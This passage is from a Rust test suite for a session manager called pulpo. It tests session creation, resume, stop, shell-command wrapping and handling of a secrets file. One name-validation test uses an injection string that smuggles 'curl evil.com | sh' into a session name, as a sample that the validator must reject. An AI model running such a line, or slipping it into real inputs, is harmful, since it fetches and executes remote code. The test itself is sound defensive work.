        }
    }

    async fn test_manager(
        backend: MockBackend,
    ) -> (SessionManager, Arc<MockBackend>, sqlx::SqlitePool) {
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let pool = store.pool().clone();
        let backend = Arc::new(backend);
        let manager =
            SessionManager::new(backend.clone(), store, HashMap::new(), None).with_no_stale_grace();
        (manager, backend, pool)
    }

    fn make_req(name: &str) -> CreateSessionRequest {
        CreateSessionRequest {
            name: name.to_owned(),
            workdir: Some("/tmp".into()),
            command: Some("echo hello".into()),
            ink: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
        }
    }

    #[tokio::test]
    async fn test_create_session_defaults() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("fix-the-bug")).await.unwrap();

        assert_eq!(session.name, "fix-the-bug");
        assert_eq!(session.command, "echo hello");
        assert_eq!(session.status, SessionStatus::Active);
        assert_eq!(session.workdir, "/tmp");
        // MockBackend.query_backend_id() returns $N where N is the name length
        assert_eq!(session.backend_session_id, Some("$11".into()));

        let calls = backend.calls.lock().unwrap();
        // All commands wrapped in bash -l -c for session survival
        assert!(calls[0].contains("-l -c"));
        assert!(calls[0].contains("echo hello"));
        assert!(calls[1].starts_with("setup_logging:fix-the-bug:"));
        assert_eq!(calls.len(), 2);
        drop(calls);
    }

    #[tokio::test]
    async fn test_create_session_no_command_falls_back_to_shell() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "test".into(),
            workdir: Some("/tmp".into()),
            command: None,
            ink: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        // Should fall back to $SHELL or /bin/sh
        assert!(!session.command.is_empty());
        let calls = backend.calls.lock().unwrap();
        assert!(calls[0].contains("-l -c"));
        drop(calls);
    }

    #[tokio::test]
    async fn test_create_session_with_ink() {
        let mut inks = HashMap::new();
        inks.insert(
            "coder".into(),
            InkConfig {
                description: Some("Coder ink".into()),
                command: Some("claude -p 'implement'".into()),
                ..InkConfig::default()
            },
        );
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend = Arc::new(MockBackend::new());
        let mgr = SessionManager::new(backend, store, inks, None).with_no_stale_grace();

        let req = CreateSessionRequest {
            name: "ink-test".into(),
            workdir: Some("/tmp".into()),
            command: None,
            ink: Some("coder".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.command, "claude -p 'implement'");
        assert_eq!(session.description, Some("Coder ink".into()));
    }

    #[tokio::test]
    async fn test_create_session_command_overrides_ink() {
        let mut inks = HashMap::new();
        inks.insert(
            "coder".into(),
            InkConfig {
                description: Some("Coder ink".into()),
                command: Some("claude -p 'default'".into()),
                ..InkConfig::default()
            },
        );
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend = Arc::new(MockBackend::new());
        let mgr = SessionManager::new(backend, store, inks, None).with_no_stale_grace();

        let req = CreateSessionRequest {
            name: "override-test".into(),
            workdir: Some("/tmp".into()),
            command: Some("my-custom-command".into()),
            ink: Some("coder".into()),
            description: Some("My desc".into()),
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        // Explicit command wins over ink command
        assert_eq!(session.command, "my-custom-command");
        assert_eq!(session.description, Some("My desc".into()));
    }

    #[tokio::test]
    async fn test_create_session_unknown_ink() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "test".into(),
            workdir: Some("/tmp".into()),
            command: None,
            ink: Some("nonexistent".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
        };
        let result = mgr.create_session(req).await;
        let err = result.unwrap_err().to_string();
        assert!(err.contains("unknown ink"), "got: {err}");
    }

    #[test]
    fn test_validate_session_name_valid() {
        assert!(validate_session_name("my-session").is_ok());
        assert!(validate_session_name("a").is_ok());
        assert!(validate_session_name("fix-auth-123").is_ok());
        assert!(validate_session_name("nightly-20260331-0300").is_ok());
    }

    #[test]
    fn test_validate_session_name_rejects_shell_injection() {
        let result = validate_session_name("x'; curl evil.com | sh; echo '");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("lowercase"));
    }

    #[test]
    fn test_validate_session_name_rejects_special_chars() {
        assert!(validate_session_name("").is_err());
        assert!(validate_session_name("Has Spaces").is_err());
        assert!(validate_session_name("UPPERCASE").is_err());
        assert!(validate_session_name("has.dots").is_err());
        assert!(validate_session_name("has:colons").is_err());
        assert!(validate_session_name("-leading-hyphen").is_err());
        assert!(validate_session_name("trailing-hyphen-").is_err());
    }

    #[test]
    fn test_validate_session_name_rejects_long_names() {
        let long = "a".repeat(129);
        assert!(validate_session_name(&long).is_err());
        let ok = "a".repeat(128);
        assert!(validate_session_name(&ok).is_ok());
    }

    #[test]
    fn test_wrap_command_escapes_session_name() {
        // Even if validation is bypassed, wrap_command should escape the name
        let id = uuid::Uuid::new_v4();
        let wrapped = wrap_command("echo test", &id, "safe-name", None);
        assert!(wrapped.contains("PULPO_SESSION_NAME=safe-name"));
        // Verify single quotes in name would be escaped (defense-in-depth)
        let wrapped = wrap_command("echo test", &id, "name'inject", None);
        assert!(!wrapped.contains("name'inject"));
        assert!(wrapped.contains("name'\\''inject"));
    }

    #[tokio::test]
    async fn test_create_session_rejects_invalid_name() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "bad name with spaces".into(),
            workdir: Some("/tmp".into()),
            command: Some("echo".into()),
            ink: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
        };
        let err = mgr.create_session(req).await.unwrap_err().to_string();
        assert!(err.contains("lowercase"), "got: {err}");
    }

    #[tokio::test]
    async fn test_create_session_default_workdir() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "defaults-test".into(),
            workdir: None,
            command: Some("echo test".into()),
            ink: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        assert!(!session.workdir.is_empty());
    }

    #[tokio::test]
    async fn test_create_session_calls_setup_logging() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let _session = mgr.create_session(make_req("test")).await.unwrap();

        let calls = backend.calls.lock().unwrap();
        assert!(
            calls.iter().any(|c| c.starts_with("setup_logging:")),
            "Expected setup_logging call, got: {calls:?}"
        );
        drop(calls);
    }

    #[tokio::test]
    async fn test_create_session_explicit_name() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "custom-name".into(),
            ..make_req("test")
        };
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.name, "custom-name");
    }

    #[tokio::test]
    async fn test_create_session_workdir_not_found() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            workdir: Some("/nonexistent/path/that/does/not/exist".into()),
            ..make_req("test")
        };
        let result = mgr.create_session(req).await;
        let err = result.unwrap_err().to_string();
        assert!(err.contains("does not exist"), "got: {err}");
    }

    #[tokio::test]
    async fn test_create_session_workdir_is_file() {
        let tmp = tempfile::NamedTempFile::new().unwrap();
        let path = tmp.path().to_str().unwrap().to_owned();
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            workdir: Some(path),
            ..make_req("test")
        };
        let result = mgr.create_session(req).await;
        let err = result.unwrap_err().to_string();
        assert!(err.contains("not a directory"), "got: {err}");
    }

    #[tokio::test]
    async fn test_create_session_backend_failure() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_create_error()).await;
        let result = mgr.create_session(make_req("test")).await;
        assert!(result.is_err());

        // Session should be marked Dead in store
        let sessions = mgr.list_sessions().await.unwrap();
        assert_eq!(sessions.len(), 1);
        assert_eq!(sessions[0].status, SessionStatus::Stopped);
    }

    #[tokio::test]
    async fn test_create_session_backend_failure_cleans_up_secrets_file() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_create_error()).await;
        // Pre-populate a secret
        mgr.store()
            .set_secret("CLEANUP_TOKEN", "val123")
            .await
            .unwrap();
        let mut req = make_req("cleanup-test");
        req.secrets = Some(vec!["CLEANUP_TOKEN".into()]);
        let result = mgr.create_session(req).await;
        assert!(result.is_err());

        // The secrets file should have been cleaned up
        let data_dir = mgr.store().data_dir();
        let secrets_dir = format!("{data_dir}/secrets");
        if std::fs::exists(&secrets_dir).unwrap_or(false) {
            let entries: Vec<_> = std::fs::read_dir(&secrets_dir)
                .unwrap()
                .filter_map(std::result::Result::ok)
                .collect();
            assert!(
                entries.is_empty(),
                "secrets file should have been cleaned up, found: {entries:?}"
            );
        }
    }

    #[test]
    fn test_write_secrets_file_creates_secrets_subdirectory() {
        let tmpdir = tempfile::tempdir().unwrap();
        let data_dir = tmpdir.path().to_str().unwrap();
        let id = uuid::Uuid::new_v4();
        let mut secrets = HashMap::new();
        secrets.insert("KEY".to_owned(), "val".to_owned());
        let path = write_secrets_file(&id, &secrets, data_dir)
            .unwrap()
            .unwrap();
        // File should be under data_dir/secrets/
        assert!(path.starts_with(&format!("{data_dir}/secrets/")));
        assert!(std::path::Path::new(&path).exists());
    }

    #[tokio::test]
    async fn test_create_session_duplicate_name_rejected() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        mgr.create_session(make_req("dupe")).await.unwrap();
        let err = mgr.create_session(make_req("dupe")).await.unwrap_err();
        assert!(
            err.to_string().contains("already active"),
            "expected duplicate name error, got: {err}"
        );
    }

    #[tokio::test]
    async fn test_create_session_reuse_name_after_stop() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        mgr.create_session(make_req("reuse")).await.unwrap();
        mgr.stop_session("reuse", false).await.unwrap();
        // Should succeed — the old session is stopped
        mgr.create_session(make_req("reuse")).await.unwrap();
    }

    #[tokio::test]
    async fn test_get_session_alive() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Active);
    }

    #[tokio::test]
    async fn test_get_session_dead_lazy_update() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_get_session_idle_with_dead_backend_transitions_to_lost() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        // Manually set session to Idle (simulates watchdog marking it idle before reboot)
        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Idle)
            .await
            .unwrap();

        // When fetched, check_and_mark_stale should detect dead backend and mark Lost
        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_get_session_idle_with_alive_backend_stays_idle() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(true)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Idle)
            .await
            .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Idle);
    }

    #[tokio::test]
    async fn test_list_sessions_idle_with_dead_backend_transitions_to_lost() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        // Manually set session to Idle
        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Idle)
            .await
            .unwrap();

        let sessions = mgr.list_sessions().await.unwrap();
        assert_eq!(sessions[0].status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_get_session_not_found() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let result = mgr.get_session("nonexistent").await.unwrap();
        assert!(result.is_none());
    }

    #[tokio::test]
    async fn test_list_sessions_with_mixed_status() {
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let s1 = mgr.create_session(make_req("first")).await.unwrap();

        let sessions = mgr.list_sessions().await.unwrap();
        assert_eq!(sessions.len(), 1);
        // is_alive returns false, so Running → Stale
        assert_eq!(sessions[0].id, s1.id);
        assert_eq!(sessions[0].status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_stop_session() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        mgr.stop_session(&session.id.to_string(), false)
            .await
            .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Stopped);
    }

    #[tokio::test]
    async fn test_stop_session_with_purge() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let id = session.id.to_string();

        mgr.stop_session(&id, true).await.unwrap();

        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    #[tokio::test]
    async fn test_stop_session_not_found() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let result = mgr.stop_session("nonexistent", false).await;
        assert!(result.is_err());
        assert!(
            result
                .unwrap_err()
                .to_string()
                .contains("session not found")
        );
    }

    #[tokio::test]
    async fn test_stop_session_backend_error_recovers_by_name() {
        // Kill by stale $N ID fails, but retry by session name succeeds
        let (mgr, _, _pool) = test_manager(MockBackend::new().with_kill_error()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        let result = mgr.stop_session(&session.id.to_string(), false).await;
        assert!(result.is_ok(), "stop should succeed via name fallback");
    }

    #[tokio::test]
    async fn test_capture_output() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let output = mgr.capture_output("some-id", "my-session", 100);
        assert_eq!(output, "test output");
    }

    #[tokio::test]
    async fn test_capture_output_falls_back_to_log() {
        let backend = MockBackend::new();
        *backend.captured_output.lock().unwrap() = String::new();
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let data_dir = tmpdir.path().to_str().unwrap();
        let store = Store::new(data_dir).await.unwrap();
        store.migrate().await.unwrap();

        // Create a log file
        let log_dir = format!("{data_dir}/logs");
        std::fs::create_dir_all(&log_dir).unwrap();
        std::fs::write(
            format!("{log_dir}/test-id.log"),
            "line 1\nline 2\nline 3\nline 4\nline 5\n",
        )
        .unwrap();

        // Verify all FailCapture backend methods for coverage
        let fc = FailCapture;
        assert!(fc.create_session("n", "d", "c").is_ok());
        assert!(fc.kill_session("n").is_ok());
        assert!(fc.is_alive("n").unwrap());
        assert!(fc.capture_output("n", 10).is_err());
        assert!(fc.send_input("n", "t").is_ok());
        assert!(fc.setup_logging("n", "p").is_ok());

        let mgr = SessionManager::new(Arc::new(FailCapture), store, HashMap::new(), None);
        let output = mgr.capture_output("test-id", "whatever", 3);
        assert_eq!(output, "line 3\nline 4\nline 5");
    }

    #[tokio::test]
    async fn test_read_log_tail_missing_file() {
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let mgr = SessionManager::new(
            Arc::new(MockBackend::new()) as Arc<dyn Backend>,
            store,
            HashMap::new(),
            None,
        );
        // read_log_tail for nonexistent file returns empty string
        let output = mgr.read_log_tail("nonexistent", 10);
        assert!(output.is_empty());
    }

    #[tokio::test]
    async fn test_send_input() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        mgr.send_input("my-session", "hello").unwrap();

        let calls = backend.calls.lock().unwrap();
        assert!(
            calls
                .iter()
                .any(|c| c.contains("send_input:my-session:hello"))
        );
        drop(calls);
    }

    #[tokio::test]
    async fn test_create_session_store_insert_failure() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        // Drop the table to make insert_session fail
        sqlx::query("DROP TABLE sessions")
            .execute(&pool)
            .await
            .unwrap();
        let result = mgr.create_session(make_req("test")).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_list_sessions_store_failure() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        sqlx::query("DROP TABLE sessions")
            .execute(&pool)
            .await
            .unwrap();
        let result = mgr.list_sessions().await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_get_session_store_failure() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        sqlx::query("DROP TABLE sessions")
            .execute(&pool)
            .await
            .unwrap();
        let result = mgr.get_session("test").await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_stop_session_store_failure() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        sqlx::query("DROP TABLE sessions")
            .execute(&pool)
            .await
            .unwrap();
        let result = mgr.stop_session("test", false).await;
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_workdir_ok() {
        assert!(validate_workdir("/tmp").is_ok());
    }

    #[test]
    fn test_validate_workdir_missing() {
        let err = validate_workdir("/nonexistent/path")
            .unwrap_err()
            .to_string();
        assert!(err.contains("does not exist"), "got: {err}");
    }

    #[test]
    fn test_validate_workdir_is_file() {
        let tmp = tempfile::NamedTempFile::new().unwrap();
        let path = tmp.path().to_str().unwrap();
        let err = validate_workdir(path).unwrap_err().to_string();
        assert!(err.contains("not a directory"), "got: {err}");
    }

    #[tokio::test]
    async fn test_resume_stale_session() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        // get_session marks it Stale since is_alive returns false
        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);

        // Now resume it — backend session is still alive, so it should skip create_session
        *backend.alive.lock().unwrap() = true;
        backend.calls.lock().unwrap().clear();
        let resumed = mgr.resume_session(&session.id.to_string()).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Active);

        // Verify create_session was NOT called (backend session already exists)
        let calls: Vec<_> = backend.calls.lock().unwrap().clone();
        assert!(
            !calls.iter().any(|c| c.starts_with("create:")),
            "should not recreate backend session when alive; calls: {calls:?}"
        );
    }

    #[tokio::test]
    async fn test_resume_stale_session_recreates_when_backend_dead() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        // get_session marks it Stale since is_alive returns false
        let _ = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();

        // Resume while backend session is dead — should recreate
        backend.calls.lock().unwrap().clear();
        let resumed = mgr.resume_session(&session.id.to_string()).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Active);

        // Verify create_session WAS called
        let calls: Vec<_> = backend.calls.lock().unwrap().clone();
        assert!(
            calls.iter().any(|c| c.starts_with("create:")),
            "should recreate backend session when dead; calls: {calls:?}"
        );
    }

    #[tokio::test]
    async fn test_resume_non_stale_session_fails() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        // Session is Active, not Lost/Ready
        let result = mgr.resume_session(&session.id.to_string()).await;
        assert!(result.is_err());
        assert!(
            result
                .unwrap_err()
                .to_string()
                .contains("cannot be resumed")
        );
    }

    #[tokio::test]
    async fn test_resume_nonexistent_session() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let result = mgr.resume_session("nonexistent").await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("not found"));
    }

    #[tokio::test]
    async fn test_resume_name_collision_rejected() {
        let (mgr, _, pool) = test_manager(MockBackend::new().with_alive(false)).await;
        // Create "dup", then mark it lost so it's resumable
        let old = mgr.create_session(make_req("dup")).await.unwrap();
        let old_id = old.id.to_string();
        sqlx::query("UPDATE sessions SET status = 'lost' WHERE id = ?")
            .bind(&old_id)
            .execute(&pool)
            .await
            .unwrap();
        // Create a new active "dup"
        mgr.create_session(make_req("dup")).await.unwrap();
        // Resuming the old lost one should fail — name collision
        let err = mgr.resume_session(&old_id).await.unwrap_err();
        assert!(err.to_string().contains("already active"), "{err}");
    }

    #[tokio::test]
    async fn test_resume_backend_failure() {
        let backend = MockBackend::new().with_alive(false);
        let (mgr, backend_ref, _pool) = test_manager(backend).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();

        let id = session.id.to_string();

        // Mark stale
        let _ = mgr.get_session(&id).await.unwrap();

        // Make create_session fail for resume
        *backend_ref.create_result.lock().unwrap() = Err(anyhow!("backend not found"));
        let result = mgr.resume_session(&id).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_resume_ready_session_does_not_self_collide() {
        let (mgr, _, pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("ready-test")).await.unwrap();
        let id = session.id.to_string();

        // Mark session as Ready (simulates a session whose agent finished)
        sqlx::query("UPDATE sessions SET status = 'ready' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();

        // Resuming a Ready session should succeed — it must not collide with itself
        let resumed = mgr.resume_session(&id).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Active);
    }

    #[test]
    fn test_wrap_command_basic() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("echo hello", &id, "test-session", None);
        assert!(cmd.contains("-l -c"));
        assert!(cmd.contains("echo hello"));
        assert!(cmd.contains("[pulpo] Agent exited (session: test-session)"));
        assert!(cmd.contains("Run: pulpo resume test-session"));
        // Fallback shell uses $SHELL (or /bin/bash), run as login shell
        assert!(cmd.contains("exec "));
        assert!(cmd.contains(" -l'"));
        assert!(cmd.contains(&format!("PULPO_SESSION_ID={id}")));
        assert!(cmd.contains("PULPO_SESSION_NAME=test-session"));
    }

    #[test]
    fn test_wrap_command_single_quotes() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("claude -p 'Fix the bug'", &id, "my-task", None);
        assert!(cmd.contains("-l -c"));
        // Single quotes should be properly escaped
        assert!(cmd.contains("claude -p"));
        assert!(cmd.contains("Fix the bug"));
        assert!(cmd.contains("PULPO_SESSION_ID="));
        assert!(cmd.contains("PULPO_SESSION_NAME=my-task"));
        assert!(cmd.contains("(session: my-task)"));
        assert!(cmd.contains("Run: pulpo resume my-task"));
    }

    #[test]
    fn test_wrap_command_quoting_is_valid_shell() {
        // Verify the wrapped command has balanced single quotes so it doesn't
        // cause "unmatched '" errors when tmux passes it to the shell.
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("claude", &id, "test-session", None);

        // Count single quotes outside of escaped sequences (\')
        // The '\'' pattern (end-quote, escaped-quote, start-quote) is valid.
        // After removing all '\'' patterns, remaining quotes must be balanced.
        let simplified = cmd.replace("'\\''", "X");
        let quote_count = simplified.chars().filter(|&c| c == '\'').count();
        assert_eq!(
            quote_count % 2,
            0,
            "unbalanced single quotes in wrapped command: {cmd}"
        );
    }

    #[test]
    fn test_wrap_command_executes_without_parse_error() {
        // Run the entire wrapped command through `sh -n` (parse-only) to catch
        // quoting bugs. The wrapped command is a complete shell invocation like
        // `/bin/zsh -l -c '...'`, so we parse it as a whole.
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("true", &id, "test-session", None);

        let output = std::process::Command::new("sh")
            .args(["-n", "-c", &cmd])
            .output()
            .expect("failed to spawn shell");

        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(
            output.status.success(),
            "wrapped command has shell syntax errors:\n  command: {cmd}\n  stderr: {stderr}"
        );
    }

    #[test]
    fn test_wrap_command_with_quotes_executes_without_parse_error() {
        // Same test but with a command containing single quotes (common with claude -p).
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("echo 'hello world'", &id, "quoted-session", None);

        let output = std::process::Command::new("sh")
            .args(["-n", "-c", &cmd])
            .output()
            .expect("failed to spawn shell");

        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(
            output.status.success(),
            "wrapped command with quotes has shell syntax errors:\n  command: {cmd}\n  stderr: {stderr}"
        );
    }

    #[test]
    fn test_is_shell_command() {
        assert!(is_shell_command("bash"));
        assert!(is_shell_command("zsh"));
        assert!(is_shell_command("sh"));
        assert!(is_shell_command("fish"));
        assert!(is_shell_command("nu"));
        assert!(is_shell_command("/bin/bash"));
        assert!(is_shell_command("/usr/bin/zsh"));
        assert!(!is_shell_command("claude"));
        assert!(!is_shell_command("claude -p 'fix'"));
        assert!(!is_shell_command("npm run lint"));
        assert!(!is_shell_command("bash -c 'echo hello'"));
    }

    #[test]
    fn test_wrap_command_shell_no_exit_marker() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("bash", &id, "my-shell", None);
        assert!(cmd.contains("exec bash"));
        assert!(cmd.contains(&format!("PULPO_SESSION_ID={id}")));
        assert!(cmd.contains("PULPO_SESSION_NAME=my-shell"));
        // Shell sessions should NOT have exit marker or fallback bash
        assert!(!cmd.contains("[pulpo] Agent exited"));
        assert!(!cmd.contains("Run: pulpo resume"));
    }

    #[test]
    fn test_wrap_command_shell_with_path() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("/usr/bin/zsh", &id, "zsh-session", None);
        assert!(cmd.contains("exec /usr/bin/zsh"));
        assert!(!cmd.contains("[pulpo] Agent exited"));
    }

    #[test]
    fn test_wrap_command_with_secrets_file() {
        let id = uuid::Uuid::new_v4();
        let secrets_path = "/tmp/pulpo-secrets-test.sh";
        let cmd = wrap_command("echo hello", &id, "test", Some(secrets_path));
        // Command should source the secrets file and delete it — NOT contain secret values
        assert!(cmd.contains(". /tmp/pulpo-secrets-test.sh && rm -f /tmp/pulpo-secrets-test.sh"));
        assert!(cmd.contains("echo hello"));
        // Secret values should NOT appear in the command string
        assert!(!cmd.contains("export GITHUB_TOKEN"));
    }

    #[test]
    fn test_wrap_command_shell_with_secrets_file() {
        let id = uuid::Uuid::new_v4();
        let secrets_path = "/tmp/pulpo-secrets-shell.sh";
        let cmd = wrap_command("bash", &id, "my-shell", Some(secrets_path));
        assert!(cmd.contains(". /tmp/pulpo-secrets-shell.sh && rm -f /tmp/pulpo-secrets-shell.sh"));
        assert!(cmd.contains("exec bash"));
    }

    #[test]
    fn test_wrap_command_no_secrets_file() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("echo hello", &id, "test", None);
        // Without secrets, no source/rm prefix should appear
        assert!(!cmd.contains(". /tmp/pulpo-secrets"));
        assert!(!cmd.contains("rm -f"));
        assert!(cmd.contains("echo hello"));
    }

    #[test]
    fn test_write_secrets_file_empty() {
        let tmpdir = tempfile::tempdir().unwrap();
        let id = uuid::Uuid::new_v4();
        let result =
            write_secrets_file(&id, &HashMap::new(), tmpdir.path().to_str().unwrap()).unwrap();
        assert!(result.is_none());
    }

    #[test]
    fn test_write_secrets_file_creates_file() {
        let tmpdir = tempfile::tempdir().unwrap();
        let data_dir = tmpdir.path().to_str().unwrap();
        let id = uuid::Uuid::new_v4();
        let mut secrets = HashMap::new();
        secrets.insert("GITHUB_TOKEN".to_owned(), "ghp_abc123".to_owned());
        secrets.insert("NPM_TOKEN".to_owned(), "npm_xyz".to_owned());

        let path = write_secrets_file(&id, &secrets, data_dir)
            .unwrap()
            .unwrap();
        assert_eq!(path, format!("{data_dir}/secrets/secrets-{id}.sh"));

        // File should exist and contain export statements
        let content = std::fs::read_to_string(&path).unwrap();
        assert!(content.contains("export GITHUB_TOKEN='ghp_abc123'"));
        assert!(content.contains("export NPM_TOKEN='npm_xyz'"));

        // File should have restrictive permissions (0600) set atomically
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let metadata = std::fs::metadata(&path).unwrap();
            assert_eq!(metadata.permissions().mode() & 0o777, 0o600);
        }
    }

    #[test]
    fn test_write_secrets_file_escapes_single_quotes() {
        let tmpdir = tempfile::tempdir().unwrap();
        let data_dir = tmpdir.path().to_str().unwrap();
        let id = uuid::Uuid::new_v4();
        let mut secrets = HashMap::new();
        secrets.insert("MY_KEY".to_owned(), "value'with'quotes".to_owned());

        let path = write_secrets_file(&id, &secrets, data_dir)
            .unwrap()
            .unwrap();
        let content = std::fs::read_to_string(&path).unwrap();
        assert!(content.contains("export MY_KEY='value'\\''with'\\''quotes'"));
    }

    #[tokio::test]
    async fn test_create_session_with_secrets() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        // Pre-populate secrets
        mgr.store()
            .set_secret("MY_TOKEN", "secret123")
